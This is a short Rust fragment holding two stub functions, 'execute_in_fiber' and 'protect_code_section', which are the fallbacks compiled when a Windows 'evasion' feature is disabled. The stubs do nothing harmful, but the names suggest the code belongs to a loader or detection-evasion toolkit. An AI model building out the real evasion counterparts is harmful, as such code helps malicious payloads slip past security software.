pub fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool { func(); false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn protect_code_section(_executable: bool) -> bool { false }
